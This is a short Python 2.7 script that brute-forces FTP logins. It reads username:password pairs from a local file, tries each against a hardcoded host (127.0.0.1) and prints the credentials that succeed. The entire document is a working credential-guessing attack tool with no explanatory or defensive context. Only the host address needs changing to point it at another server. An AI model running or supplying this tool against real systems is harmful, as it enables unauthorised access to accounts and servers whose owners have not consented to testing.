#!/usr/bin/python2.7
import ftplib
import sys, os

def connect(Data, host):
	try:
		data = Data.split(':')
		user = data[0]
		password  = data[1].strip('\n')
		print '[+] Trying: %s/%s'%(user, password)
		ftp = ftplib.FTP(host)
		ftp.login(user,password)
		print '\033[4;33m[*] %s Logon Succeeded : %s/%s.\033[0;0m'%(host, user,password)
	except Exception, e:
		pass

def main():
	File = open('users','r')
	for login in File.readlines():
		connect(login,'127.0.0.1')
	

if __name__ == '__main__':
	main()
